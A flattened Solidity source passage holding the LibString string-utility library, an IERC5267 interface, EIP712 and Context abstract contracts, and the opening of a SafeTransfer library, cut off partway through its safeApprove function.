1 // File: contracts/utils/LibString.sol
2 
3 
4 pragma solidity ^0.8.4;
5 
6 /// @notice Library for converting numbers into strings and other string operations.
7 /// @author SolDAO (https://github.com/Sol-DAO/solbase/blob/main/src/utils/LibString.sol)
8 /// @author Solady (https://github.com/vectorized/solady/blob/main/src/utils/LibString.sol)
9 library LibString {
10     /// -----------------------------------------------------------------------
11     /// Custom Errors
12     /// -----------------------------------------------------------------------
13 
14     /// @dev The `length` of the output is too small to contain all the hex digits.
15     error HexLengthInsufficient();
16 
17     /// -----------------------------------------------------------------------
18     /// Constants
19     /// -----------------------------------------------------------------------
20 
21     /// @dev The constant returned when the `search` is not found in the string.
22     uint256 internal constant NOT_FOUND = uint256(int256(-1));
23 
24     /// -----------------------------------------------------------------------
25     /// Decimal Operations
26     /// -----------------------------------------------------------------------
27 
28     /// @dev Returns the base 10 decimal representation of `value`.
29     function toString(uint256 value) internal pure returns (string memory str) {
30         assembly {
31             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
32             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
33             // We will need 1 word for the trailing zeros padding, 1 word for the length,
34             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
35             let m := add(mload(0x40), 0xa0)
36             // Update the free memory pointer to allocate.
37             mstore(0x40, m)
38             // Assign the `str` to the end.
39             str := sub(m, 0x20)
40             // Zeroize the slot after the string.
41             mstore(str, 0)
42 
43             // Cache the end of the memory to calculate the length later.
44             let end := str
45 
46             // We write the string from rightmost digit to leftmost digit.
47             // The following is essentially a do-while loop that also handles the zero case.
48             // prettier-ignore
49             for { let temp := value } 1 {} {
50                 str := sub(str, 1)
51                 // Write the character to the pointer.
52                 // The ASCII index of the '0' character is 48.
53                 mstore8(str, add(48, mod(temp, 10)))
54                 // Keep dividing `temp` until zero.
55                 temp := div(temp, 10)
56                 // prettier-ignore
57                 if iszero(temp) { break }
58             }
59 
60             let length := sub(end, str)
61             // Move the pointer 32 bytes leftwards to make room for the length.
62             str := sub(str, 0x20)
63             // Store the length.
64             mstore(str, length)
65         }
66     }
67 
68     /// -----------------------------------------------------------------------
69     /// Hexadecimal Operations
70     /// -----------------------------------------------------------------------
71 
72     /// @dev Returns the hexadecimal representation of `value`,
73     /// left-padded to an input length of `length` bytes.
74     /// The output is prefixed with "0x" encoded using 2 hexadecimal digits per byte,
75     /// giving a total length of `length * 2 + 2` bytes.
76     /// Reverts if `length` is too small for the output to contain all the digits.
77     function toHexString(uint256 value, uint256 length) internal pure returns (string memory str) {
78         assembly {
79             let start := mload(0x40)
80             // We need 0x20 bytes for the trailing zeros padding, `length * 2` bytes
81             // for the digits, 0x02 bytes for the prefix, and 0x20 bytes for the length.
82             // We add 0x20 to the total and round down to a multiple of 0x20.
83             // (0x20 + 0x20 + 0x02 + 0x20) = 0x62.
84             let m := add(start, and(add(shl(1, length), 0x62), not(0x1f)))
85             // Allocate the memory.
86             mstore(0x40, m)
87             // Assign the `str` to the end.
88             str := sub(m, 0x20)
89             // Zeroize the slot after the string.
90             mstore(str, 0)
91 
92             // Cache the end to calculate the length later.
93             let end := str
94             // Store "0123456789abcdef" in scratch space.
95             mstore(0x0f, 0x30313233343536373839616263646566)
96 
97             let temp := value
98             // We write the string from rightmost digit to leftmost digit.
99             // The following is essentially a do-while loop that also handles the zero case.
100             // prettier-ignore
101             for {} 1 {} {
102                 str := sub(str, 2)
103                 mstore8(add(str, 1), mload(and(temp, 15)))
104                 mstore8(str, mload(and(shr(4, temp), 15)))
105                 temp := shr(8, temp)
106                 length := sub(length, 1)
107                 // prettier-ignore
108                 if iszero(length) { break }
109             }
110 
111             if temp {
112                 // Store the function selector of `HexLengthInsufficient()`.
113                 mstore(0x00, 0x2194895a)
114                 // Revert with (offset, size).
115                 revert(0x1c, 0x04)
116             }
117 
118             // Compute the string's length.
119             let strLength := add(sub(end, str), 2)
120             // Move the pointer and write the "0x" prefix.
121             str := sub(str, 0x20)
122             mstore(str, 0x3078)
123             // Move the pointer and write the length.
124             str := sub(str, 2)
125             mstore(str, strLength)
126         }
127     }
128 
129     /// @dev Returns the hexadecimal representation of `value`.
130     /// The output is prefixed with "0x" and encoded using 2 hexadecimal digits per byte.
131     /// As address are 20 bytes long, the output will left-padded to have
132     /// a length of `20 * 2 + 2` bytes.
133     function toHexString(uint256 value) internal pure returns (string memory str) {
134         assembly {
135             let start := mload(0x40)
136             // We need 0x20 bytes for the trailing zeros padding, 0x20 bytes for the length,
137             // 0x02 bytes for the prefix, and 0x40 bytes for the digits.
138             // The next multiple of 0x20 above (0x20 + 0x20 + 0x02 + 0x40) is 0xa0.
139             let m := add(start, 0xa0)
140             // Allocate the memory.
141             mstore(0x40, m)
142             // Assign the `str` to the end.
143             str := sub(m, 0x20)
144             // Zeroize the slot after the string.
145             mstore(str, 0)
146 
147             // Cache the end to calculate the length later.
148             let end := str
149             // Store "0123456789abcdef" in scratch space.
150             mstore(0x0f, 0x30313233343536373839616263646566)
151 
152             // We write the string from rightmost digit to leftmost digit.
153             // The following is essentially a do-while loop that also handles the zero case.
154             // prettier-ignore
155             for { let temp := value } 1 {} {
156                 str := sub(str, 2)
157                 mstore8(add(str, 1), mload(and(temp, 15)))
158                 mstore8(str, mload(and(shr(4, temp), 15)))
159                 temp := shr(8, temp)
160                 // prettier-ignore
161                 if iszero(temp) { break }
162             }
163 
164             // Compute the string's length.
165             let strLength := add(sub(end, str), 2)
166             // Move the pointer and write the "0x" prefix.
167             str := sub(str, 0x20)
168             mstore(str, 0x3078)
169             // Move the pointer and write the length.
170             str := sub(str, 2)
171             mstore(str, strLength)
172         }
173     }
174 
175     /// @dev Returns the hexadecimal representation of `value`.
176     /// The output is prefixed with "0x" and encoded using 2 hexadecimal digits per byte.
177     function toHexString(address value) internal pure returns (string memory str) {
178         assembly {
179             let start := mload(0x40)
180             // We need 0x20 bytes for the length, 0x02 bytes for the prefix,
181             // and 0x28 bytes for the digits.
182             // The next multiple of 0x20 above (0x20 + 0x02 + 0x28) is 0x60.
183             str := add(start, 0x60)
184 
185             // Allocate the memory.
186             mstore(0x40, str)
187             // Store "0123456789abcdef" in scratch space.
188             mstore(0x0f, 0x30313233343536373839616263646566)
189 
190             let length := 20
191             // We write the string from rightmost digit to leftmost digit.
192             // The following is essentially a do-while loop that also handles the zero case.
193             // prettier-ignore
194             for { let temp := value } 1 {} {
195                 str := sub(str, 2)
196                 mstore8(add(str, 1), mload(and(temp, 15)))
197                 mstore8(str, mload(and(shr(4, temp), 15)))
198                 temp := shr(8, temp)
199                 length := sub(length, 1)
200                 // prettier-ignore
201                 if iszero(length) { break }
202             }
203 
204             // Move the pointer and write the "0x" prefix.
205             str := sub(str, 32)
206             mstore(str, 0x3078)
207             // Move the pointer and write the length.
208             str := sub(str, 2)
209             mstore(str, 42)
210         }
211     }
212 
213     /// -----------------------------------------------------------------------
214     /// Other String Operations
215     /// -----------------------------------------------------------------------
216 
217     // For performance and bytecode compactness, all indices of the following operations
218     // are byte (ASCII) offsets, not UTF character offsets.
219 
220     /// @dev Returns `subject` all occurances of `search` replaced with `replacement`.
221     function replace(
222         string memory subject,
223         string memory search,
224         string memory replacement
225     ) internal pure returns (string memory result) {
226         assembly {
227             let subjectLength := mload(subject)
228             let searchLength := mload(search)
229             let replacementLength := mload(replacement)
230 
231             subject := add(subject, 0x20)
232             search := add(search, 0x20)
233             replacement := add(replacement, 0x20)
234             result := add(mload(0x40), 0x20)
235 
236             let subjectEnd := add(subject, subjectLength)
237             if iszero(gt(searchLength, subjectLength)) {
238                 let subjectSearchEnd := add(sub(subjectEnd, searchLength), 1)
239                 let h := 0
240                 if iszero(lt(searchLength, 32)) {
241                     h := keccak256(search, searchLength)
242                 }
243                 let m := shl(3, sub(32, and(searchLength, 31)))
244                 let s := mload(search)
245                 // prettier-ignore
246                 for {} 1 {} {
247                     let t := mload(subject)
248                     // Whether the first `searchLength % 32` bytes of 
249                     // `subject` and `search` matches.
250                     if iszero(shr(m, xor(t, s))) {
251                         if h {
252                             if iszero(eq(keccak256(subject, searchLength), h)) {
253                                 mstore(result, t)
254                                 result := add(result, 1)
255                                 subject := add(subject, 1)
256                                 // prettier-ignore
257                                 if iszero(lt(subject, subjectSearchEnd)) { break }
258                                 continue
259                             }
260                         }
261                         // Copy the `replacement` one word at a time.
262                         // prettier-ignore
263                         for { let o := 0 } 1 {} {
264                             mstore(add(result, o), mload(add(replacement, o)))
265                             o := add(o, 0x20)
266                             // prettier-ignore
267                             if iszero(lt(o, replacementLength)) { break }
268                         }
269                         result := add(result, replacementLength)
270                         subject := add(subject, searchLength)
271                         if searchLength {
272                             // prettier-ignore
273                             if iszero(lt(subject, subjectSearchEnd)) { break }
274                             continue
275                         }
276                     }
277                     mstore(result, t)
278                     result := add(result, 1)
279                     subject := add(subject, 1)
280                     // prettier-ignore
281                     if iszero(lt(subject, subjectSearchEnd)) { break }
282                 }
283             }
284 
285             let resultRemainder := result
286             result := add(mload(0x40), 0x20)
287             let k := add(sub(resultRemainder, result), sub(subjectEnd, subject))
288             // Copy the rest of the string one word at a time.
289             // prettier-ignore
290             for {} lt(subject, subjectEnd) {} {
291                 mstore(resultRemainder, mload(subject))
292                 resultRemainder := add(resultRemainder, 0x20)
293                 subject := add(subject, 0x20)
294             }
295             result := sub(result, 0x20)
296             // Zeroize the slot after the string.
297             let last := add(add(result, 0x20), k)
298             mstore(last, 0)
299             // Allocate memory for the length and the bytes,
300             // rounded up to a multiple of 32.
301             mstore(0x40, and(add(last, 31), not(31)))
302             // Store the length of the result.
303             mstore(result, k)
304         }
305     }
306 
307     /// @dev Returns the byte index of the first location of `search` in `subject`,
308     /// searching from left to right, starting from `from`.
309     /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.
310     function indexOf(string memory subject, string memory search, uint256 from) internal pure returns (uint256 result) {
311         assembly {
312             // prettier-ignore
313             for { let subjectLength := mload(subject) } 1 {} {
314                 if iszero(mload(search)) {
315                     // `result = min(from, subjectLength)`.
316                     result := xor(from, mul(xor(from, subjectLength), lt(subjectLength, from)))
317                     break
318                 }
319                 let searchLength := mload(search)
320                 let subjectStart := add(subject, 0x20)    
321                 
322                 result := not(0) // Initialize to `NOT_FOUND`.
323 
324                 subject := add(subjectStart, from)
325                 let subjectSearchEnd := add(sub(add(subjectStart, subjectLength), searchLength), 1)
326 
327                 let m := shl(3, sub(32, and(searchLength, 31)))
328                 let s := mload(add(search, 0x20))
329 
330                 // prettier-ignore
331                 if iszero(lt(subject, subjectSearchEnd)) { break }
332 
333                 if iszero(lt(searchLength, 32)) {
334                     // prettier-ignore
335                     for { let h := keccak256(add(search, 0x20), searchLength) } 1 {} {
336                         if iszero(shr(m, xor(mload(subject), s))) {
337                             if eq(keccak256(subject, searchLength), h) {
338                                 result := sub(subject, subjectStart)
339                                 break
340                             }
341                         }
342                         subject := add(subject, 1)
343                         // prettier-ignore
344                         if iszero(lt(subject, subjectSearchEnd)) { break }
345                     }
346                     break
347                 }
348                 // prettier-ignore
349                 for {} 1 {} {
350                     if iszero(shr(m, xor(mload(subject), s))) {
351                         result := sub(subject, subjectStart)
352                         break
353                     }
354                     subject := add(subject, 1)
355                     // prettier-ignore
356                     if iszero(lt(subject, subjectSearchEnd)) { break }
357                 }
358                 break
359             }
360         }
361     }
362 
363     /// @dev Returns the byte index of the first location of `search` in `subject`,
364     /// searching from left to right.
365     /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.
366     function indexOf(string memory subject, string memory search) internal pure returns (uint256 result) {
367         result = indexOf(subject, search, 0);
368     }
369 
370     /// @dev Returns the byte index of the first location of `search` in `subject`,
371     /// searching from right to left, starting from `from`.
372     /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.
373     function lastIndexOf(
374         string memory subject,
375         string memory search,
376         uint256 from
377     ) internal pure returns (uint256 result) {
378         assembly {
379             // prettier-ignore
380             for {} 1 {} {
381                 let searchLength := mload(search)
382                 let fromMax := sub(mload(subject), searchLength)
383                 if iszero(gt(fromMax, from)) {
384                     from := fromMax
385                 }
386                 if iszero(mload(search)) {
387                     result := from
388                     break
389                 }
390                 result := not(0) // Initialize to `NOT_FOUND`.
391 
392                 let subjectSearchEnd := sub(add(subject, 0x20), 1)
393 
394                 subject := add(add(subject, 0x20), from)
395                 // prettier-ignore
396                 if iszero(gt(subject, subjectSearchEnd)) { break }
397                 // As this function is not too often used,
398                 // we shall simply use keccak256 for smaller bytecode size.
399                 // prettier-ignore
400                 for { let h := keccak256(add(search, 0x20), searchLength) } 1 {} {
401                     if eq(keccak256(subject, searchLength), h) {
402                         result := sub(subject, add(subjectSearchEnd, 1))
403                         break
404                     }
405                     subject := sub(subject, 1)
406                     // prettier-ignore
407                     if iszero(gt(subject, subjectSearchEnd)) { break }
408                 }
409                 break
410             }
411         }
412     }
413 
414     /// @dev Returns the index of the first location of `search` in `subject`,
415     /// searching from right to left.
416     /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.
417     function lastIndexOf(string memory subject, string memory search) internal pure returns (uint256 result) {
418         result = lastIndexOf(subject, search, uint256(int256(-1)));
419     }
420 
421     /// @dev Returns whether `subject` starts with `search`.
422     function startsWith(string memory subject, string memory search) internal pure returns (bool result) {
423         assembly {
424             let searchLength := mload(search)
425             // Just using keccak256 directly is actually cheaper.
426             result := and(
427                 iszero(gt(searchLength, mload(subject))),
428                 eq(keccak256(add(subject, 0x20), searchLength), keccak256(add(search, 0x20), searchLength))
429             )
430         }
431     }
432 
433     /// @dev Returns whether `subject` ends with `search`.
434     function endsWith(string memory subject, string memory search) internal pure returns (bool result) {
435         assembly {
436             let searchLength := mload(search)
437             let subjectLength := mload(subject)
438             // Whether `search` is not longer than `subject`.
439             let withinRange := iszero(gt(searchLength, subjectLength))
440             // Just using keccak256 directly is actually cheaper.
441             result := and(
442                 withinRange,
443                 eq(
444                     keccak256(
445                         // `subject + 0x20 + max(subjectLength - searchLength, 0)`.
446                         add(add(subject, 0x20), mul(withinRange, sub(subjectLength, searchLength))),
447                         searchLength
448                     ),
449                     keccak256(add(search, 0x20), searchLength)
450                 )
451             )
452         }
453     }
454 
455     /// @dev Returns `subject` repeated `times`.
456     function repeat(string memory subject, uint256 times) internal pure returns (string memory result) {
457         assembly {
458             let subjectLength := mload(subject)
459             if iszero(or(iszero(times), iszero(subjectLength))) {
460                 subject := add(subject, 0x20)
461                 result := mload(0x40)
462                 let output := add(result, 0x20)
463                 // prettier-ignore
464                 for {} 1 {} {
465                     // Copy the `subject` one word at a time.
466                     // prettier-ignore
467                     for { let o := 0 } 1 {} {
468                         mstore(add(output, o), mload(add(subject, o)))
469                         o := add(o, 0x20)
470                         // prettier-ignore
471                         if iszero(lt(o, subjectLength)) { break }
472                     }
473                     output := add(output, subjectLength)
474                     times := sub(times, 1)
475                     // prettier-ignore
476                     if iszero(times) { break }
477                 }
478                 // Zeroize the slot after the string.
479                 mstore(output, 0)
480                 // Store the length.
481                 let resultLength := sub(output, add(result, 0x20))
482                 mstore(result, resultLength)
483                 // Allocate memory for the length and the bytes,
484                 // rounded up to a multiple of 32.
485                 mstore(0x40, add(result, and(add(resultLength, 63), not(31))))
486             }
487         }
488     }
489 
490     /// @dev Returns a copy of `subject` sliced from `start` to `end` (exclusive).
491     /// `start` and `end` are byte offsets.
492     function slice(string memory subject, uint256 start, uint256 end) internal pure returns (string memory result) {
493         assembly {
494             let subjectLength := mload(subject)
495             if iszero(gt(subjectLength, end)) {
496                 end := subjectLength
497             }
498             if iszero(gt(subjectLength, start)) {
499                 start := subjectLength
500             }
501             if lt(start, end) {
502                 result := mload(0x40)
503                 let resultLength := sub(end, start)
504                 mstore(result, resultLength)
505                 subject := add(subject, start)
506                 // Copy the `subject` one word at a time, backwards.
507                 // prettier-ignore
508                 for { let o := and(add(resultLength, 31), not(31)) } 1 {} {
509                     mstore(add(result, o), mload(add(subject, o)))
510                     o := sub(o, 0x20)
511                     // prettier-ignore
512                     if iszero(o) { break }
513                 }
514                 // Zeroize the slot after the string.
515                 mstore(add(add(result, 0x20), resultLength), 0)
516                 // Allocate memory for the length and the bytes,
517                 // rounded up to a multiple of 32.
518                 mstore(0x40, add(result, and(add(resultLength, 63), not(31))))
519             }
520         }
521     }
522 
523     /// @dev Returns a copy of `subject` sliced from `start` to the end of the string.
524     /// `start` is a byte offset.
525     function slice(string memory subject, uint256 start) internal pure returns (string memory result) {
526         result = slice(subject, start, uint256(int256(-1)));
527     }
528 
529     /// @dev Returns all the indices of `search` in `subject`.
530     /// The indices are byte offsets.
531     function indicesOf(string memory subject, string memory search) internal pure returns (uint256[] memory result) {
532         assembly {
533             let subjectLength := mload(subject)
534             let searchLength := mload(search)
535 
536             if iszero(gt(searchLength, subjectLength)) {
537                 subject := add(subject, 0x20)
538                 search := add(search, 0x20)
539                 result := add(mload(0x40), 0x20)
540 
541                 let subjectStart := subject
542                 let subjectSearchEnd := add(sub(add(subject, subjectLength), searchLength), 1)
543                 let h := 0
544                 if iszero(lt(searchLength, 32)) {
545                     h := keccak256(search, searchLength)
546                 }
547                 let m := shl(3, sub(32, and(searchLength, 31)))
548                 let s := mload(search)
549                 // prettier-ignore
550                 for {} 1 {} {
551                     let t := mload(subject)
552                     // Whether the first `searchLength % 32` bytes of 
553                     // `subject` and `search` matches.
554                     if iszero(shr(m, xor(t, s))) {
555                         if h {
556                             if iszero(eq(keccak256(subject, searchLength), h)) {
557                                 subject := add(subject, 1)
558                                 // prettier-ignore
559                                 if iszero(lt(subject, subjectSearchEnd)) { break }
560                                 continue
561                             }
562                         }
563                         // Append to `result`.
564                         mstore(result, sub(subject, subjectStart))
565                         result := add(result, 0x20)
566                         // Advance `subject` by `searchLength`.
567                         subject := add(subject, searchLength)
568                         if searchLength {
569                             // prettier-ignore
570                             if iszero(lt(subject, subjectSearchEnd)) { break }
571                             continue
572                         }
573                     }
574                     subject := add(subject, 1)
575                     // prettier-ignore
576                     if iszero(lt(subject, subjectSearchEnd)) { break }
577                 }
578                 let resultEnd := result
579                 // Assign `result` to the free memory pointer.
580                 result := mload(0x40)
581                 // Store the length of `result`.
582                 mstore(result, shr(5, sub(resultEnd, add(result, 0x20))))
583                 // Allocate memory for result.
584                 // We allocate one more word, so this array can be recycled for {split}.
585                 mstore(0x40, add(resultEnd, 0x20))
586             }
587         }
588     }
589 
590     /// @dev Returns a arrays of strings based on the `delimiter` inside of the `subject` string.
591     function split(string memory subject, string memory delimiter) internal pure returns (string[] memory result) {
592         uint256[] memory indices = indicesOf(subject, delimiter);
593         assembly {
594             if mload(indices) {
595                 let indexPtr := add(indices, 0x20)
596                 let indicesEnd := add(indexPtr, shl(5, add(mload(indices), 1)))
597                 mstore(sub(indicesEnd, 0x20), mload(subject))
598                 mstore(indices, add(mload(indices), 1))
599                 let prevIndex := 0
600                 // prettier-ignore
601                 for {} 1 {} {
602                     let index := mload(indexPtr)
603                     mstore(indexPtr, 0x60)                        
604                     if iszero(eq(index, prevIndex)) {
605                         let element := mload(0x40)
606                         let elementLength := sub(index, prevIndex)
607                         mstore(element, elementLength)
608                         // Copy the `subject` one word at a time, backwards.
609                         // prettier-ignore
610                         for { let o := and(add(elementLength, 31), not(31)) } 1 {} {
611                             mstore(add(element, o), mload(add(add(subject, prevIndex), o)))
612                             o := sub(o, 0x20)
613                             // prettier-ignore
614                             if iszero(o) { break }
615                         }
616                         // Zeroize the slot after the string.
617                         mstore(add(add(element, 0x20), elementLength), 0)
618                         // Allocate memory for the length and the bytes,
619                         // rounded up to a multiple of 32.
620                         mstore(0x40, add(element, and(add(elementLength, 63), not(31))))
621                         // Store the `element` into the array.
622                         mstore(indexPtr, element)                        
623                     }
624                     prevIndex := add(index, mload(delimiter))
625                     indexPtr := add(indexPtr, 0x20)
626                     // prettier-ignore
627                     if iszero(lt(indexPtr, indicesEnd)) { break }
628                 }
629                 result := indices
630                 if iszero(mload(delimiter)) {
631                     result := add(indices, 0x20)
632                     mstore(result, sub(mload(indices), 2))
633                 }
634             }
635         }
636     }
637 
638     /// @dev Returns a concatenated string of `a` and `b`.
639     /// Cheaper than `string.concat()` and does not de-align the free memory pointer.
640     function concat(string memory a, string memory b) internal pure returns (string memory result) {
641         assembly {
642             result := mload(0x40)
643             let aLength := mload(a)
644             // Copy `a` one word at a time, backwards.
645             // prettier-ignore
646             for { let o := and(add(mload(a), 32), not(31)) } 1 {} {
647                 mstore(add(result, o), mload(add(a, o)))
648                 o := sub(o, 0x20)
649                 // prettier-ignore
650                 if iszero(o) { break }
651             }
652             let bLength := mload(b)
653             let output := add(result, mload(a))
654             // Copy `b` one word at a time, backwards.
655             // prettier-ignore
656             for { let o := and(add(bLength, 32), not(31)) } 1 {} {
657                 mstore(add(output, o), mload(add(b, o)))
658                 o := sub(o, 0x20)
659                 // prettier-ignore
660                 if iszero(o) { break }
661             }
662             let totalLength := add(aLength, bLength)
663             let last := add(add(result, 0x20), totalLength)
664             // Zeroize the slot after the string.
665             mstore(last, 0)
666             // Stores the length.
667             mstore(result, totalLength)
668             // Allocate memory for the length and the bytes,
669             // rounded up to a multiple of 32.
670             mstore(0x40, and(add(last, 31), not(31)))
671         }
672     }
673 
674     /// @dev Packs a single string with its length into a single word.
675     /// Returns `bytes32(0)` if the length is zero or greater than 31.
676     function packOne(string memory a) internal pure returns (bytes32 result) {
677         assembly {
678             // We don't need to zero right pad the string,
679             // since this is our own custom non-standard packing scheme.
680             result := mul(
681                 // Load the length and the bytes.
682                 mload(add(a, 0x1f)),
683                 // `length != 0 && length < 32`. Abuses underflow.
684                 // Assumes that the length is valid and within the block gas limit.
685                 lt(sub(mload(a), 1), 0x1f)
686             )
687         }
688     }
689 
690     /// @dev Unpacks a string packed using {packOne}.
691     /// Returns the empty string if `packed` is `bytes32(0)`.
692     /// If `packed` is not an output of {packOne}, the output behaviour is undefined.
693     function unpackOne(bytes32 packed) internal pure returns (string memory result) {
694         assembly {
695             // Grab the free memory pointer.
696             result := mload(0x40)
697             // Allocate 2 words (1 for the length, 1 for the bytes).
698             mstore(0x40, add(result, 0x40))
699             // Zeroize the length slot.
700             mstore(result, 0)
701             // Store the length and bytes.
702             mstore(add(result, 0x1f), packed)
703             // Right pad with zeroes.
704             mstore(add(add(result, 0x20), mload(result)), 0)
705         }
706     }
707 
708     /// @dev Packs two strings with their lengths into a single word.
709     /// Returns `bytes32(0)` if combined length is zero or greater than 30.
710     function packTwo(string memory a, string memory b) internal pure returns (bytes32 result) {
711         assembly {
712             let aLength := mload(a)
713             // We don't need to zero right pad the strings,
714             // since this is our own custom non-standard packing scheme.
715             result := mul(
716                 // Load the length and the bytes of `a` and `b`.
717                 or(shl(shl(3, sub(0x1f, aLength)), mload(add(a, aLength))), mload(sub(add(b, 0x1e), aLength))),
718                 // `totalLength != 0 && totalLength < 31`. Abuses underflow.
719                 // Assumes that the lengths are valid and within the block gas limit.
720                 lt(sub(add(aLength, mload(b)), 1), 0x1e)
721             )
722         }
723     }
724 
725     /// @dev Unpacks strings packed using {packTwo}.
726     /// Returns the empty strings if `packed` is `bytes32(0)`.
727     /// If `packed` is not an output of {packTwo}, the output behaviour is undefined.
728     function unpackTwo(bytes32 packed) internal pure returns (string memory resultA, string memory resultB) {
729         assembly {
730             // Grab the free memory pointer.
731             resultA := mload(0x40)
732             resultB := add(resultA, 0x40)
733             // Allocate 2 words for each string (1 for the length, 1 for the byte). Total 4 words.
734             mstore(0x40, add(resultB, 0x40))
735             // Zeroize the length slots.
736             mstore(resultA, 0)
737             mstore(resultB, 0)
738             // Store the lengths and bytes.
739             mstore(add(resultA, 0x1f), packed)
740             mstore(add(resultB, 0x1f), mload(add(add(resultA, 0x20), mload(resultA))))
741             // Right pad with zeroes.
742             mstore(add(add(resultA, 0x20), mload(resultA)), 0)
743             mstore(add(add(resultB, 0x20), mload(resultB)), 0)
744         }
745     }
746 
747     /// @dev Directly returns `a` without copying.
748     function directReturn(string memory a) internal pure {
749         assembly {
750             // Right pad with zeroes. Just in case the string is produced
751             // by a method that doesn't zero right pad.
752             mstore(add(add(a, 0x20), mload(a)), 0)
753             // Store the return offset.
754             // Assumes that the string does not start from the scratch space.
755             mstore(sub(a, 0x20), 0x20)
756             // End the transaction, returning the string.
757             return(sub(a, 0x20), add(mload(a), 0x40))
758         }
759     }
760 }
761 // File: contracts/interfaces/IERC5267.sol
762 
763 
764 // OpenZeppelin Contracts (last updated v4.9.0) (interfaces/IERC5267.sol)
765 
766 pragma solidity ^0.8.19;
767 
768 interface IERC5267 {
769     /**
770      * @dev MAY be emitted to signal that the domain could have changed.
771      */
772     event EIP712DomainChanged();
773 
774     /**
775      * @dev returns the fields and values that describe the domain separator used by this contract for EIP-712
776      * signature.
777      */
778     function eip712Domain()
779         external
780         view
781         returns (
782             bytes1 fields,
783             string memory name,
784             string memory version,
785             uint256 chainId,
786             address verifyingContract,
787             bytes32 salt,
788             uint256[] memory extensions
789         );
790 }
791 // File: contracts/abstracts/EIP712.sol
792 
793 
794 pragma solidity ^0.8.19;
795 
796 
797 
798 abstract contract EIP712 is IERC5267 {
799 
800     using LibString for *;
801 
802     bytes32 internal constant DOMAIN_TYPEHASH = 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f;
803 
804     bytes32 internal immutable DOMAIN_NAME;
805     bytes32 internal immutable HASHED_DOMAIN_NAME;
806 
807     bytes32 internal immutable DOMAIN_VERSION;
808     bytes32 internal immutable HASHED_DOMAIN_VERSION;
809 
810     bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;
811 
812     uint256 internal immutable INITIAL_CHAIN_ID;
813 
814     constructor(string memory domainName, string memory version) {
815         DOMAIN_NAME = domainName.packOne();
816         HASHED_DOMAIN_NAME = keccak256(bytes(domainName));
817         DOMAIN_VERSION = version.packOne();
818         HASHED_DOMAIN_VERSION = keccak256(bytes(version));
819         INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();
820         INITIAL_CHAIN_ID = block.chainid;
821     }
822 
823     function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
824         return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();
825     }
826 
827     function eip712Domain()
828         public
829         view
830         virtual
831         returns (
832             bytes1 fields,
833             string memory name,
834             string memory version,
835             uint256 chainId,
836             address verifyingContract,
837             bytes32 salt,
838             uint256[] memory extensions
839         )
840     {
841         return (
842             hex"0f",
843             DOMAIN_NAME.unpackOne(),
844             DOMAIN_VERSION.unpackOne(),
845             block.chainid,
846             address(this),
847             bytes32(0),
848             new uint256[](0)
849         );
850     }
851 
852     function computeDomainSeparator() internal view virtual returns (bytes32) {
853         return
854             keccak256(
855                 abi.encode(DOMAIN_TYPEHASH, HASHED_DOMAIN_NAME, HASHED_DOMAIN_VERSION, block.chainid, address(this))
856             );
857     }
858 
859     function computeDigest(bytes32 hashStruct) internal view virtual returns (bytes32) {
860         return keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR(), hashStruct));
861     }
862 }
863 // File: contracts/abstracts/Context.sol
864 
865 
866 
867 pragma solidity ^0.8.19;
868 
869 abstract contract Context {
870     function _msgSender() internal view virtual returns (address) {
871         return msg.sender;
872     }
873 
874     function _msgData() internal view virtual returns (bytes calldata) {
875         return msg.data;
876     }
877 
878     function _msgValue() internal view virtual returns(uint256) {
879         return msg.value;
880     }
881 }
882 // File: contracts/utils/SafeTransfer.sol
883 
884 
885 pragma solidity ^0.8.4;
886 
887 /// @notice Safe ETH and ERC20 transfer library that gracefully handles missing return values.
888 /// @author SolDAO (https://github.com/Sol-DAO/solbase/blob/main/src/utils/SafeTransferLib.sol)
889 /// @author Modified from Solady (https://github.com/vectorized/solady/blob/main/src/utils/SafeTransferLib.sol)
890 /// @dev Caution! This library won't check that a token has code, responsibility is delegated to the caller.
891 library SafeTransfer {
892     /// -----------------------------------------------------------------------
893     /// Custom Errors
894     /// -----------------------------------------------------------------------
895 
896     /// @dev The ETH transfer has failed.
897     error ETHTransferFailed();
898 
899     /// @dev The ERC20 `approve` has failed.
900     error ApproveFailed();
901 
902     /// @dev The ERC20 `transfer` has failed.
903     error TransferFailed();
904 
905     /// @dev The ERC20 `burn` has failed.
906     error BurnFailed();
907 
908     /// @dev The ERC20 `transferFrom` has failed.
909     error TransferFromFailed();
910 
911     /// -----------------------------------------------------------------------
912     /// ETH Operations
913     /// -----------------------------------------------------------------------
914 
915     /// @dev Sends `amount` (in wei) ETH to `to`.
916     /// Reverts upon failure.
917     function safeTransferETH(address to, uint256 amount) internal {
918         /// @solidity memory-safe-assembly
919         assembly {
920             // Transfer the ETH and check if it succeeded or not.
921             if iszero(call(gas(), to, amount, 0, 0, 0, 0)) {
922                 // Store the function selector of `ETHTransferFailed()`.
923                 mstore(0x00, 0xb12d13eb)
924                 // Revert with (offset, size).
925                 revert(0x1c, 0x04)
926             }
927         }
928     }
929 
930     /// -----------------------------------------------------------------------
931     /// ERC20 Operations
932     /// -----------------------------------------------------------------------
933 
934     /// @dev Sets `amount` of ERC20 `token` for `to` to manage on behalf of the current contract.
935     /// Reverts upon failure.
936     function safeApprove(address token, address to, uint256 amount) internal {
937         /// @solidity memory-safe-assembly
938         assembly {
939             // We'll write our calldata to this slot below, but restore it later.
940             let memPointer := mload(0x40)
941 
942             // Write the abi-encoded calldata into memory, beginning with the function selector.
943             mstore(0x00, 0x095ea7b3)
944             mstore(0x20, to) // Append the "to" argument.
945             mstore(0x40, amount) // Append the "amount" argument.
946 
947             if iszero(
948                 and(
949                     // Set success to whether the call reverted, if not we check it either
950                     // returned exactly 1 (can't just be non-zero data), or had no return data.
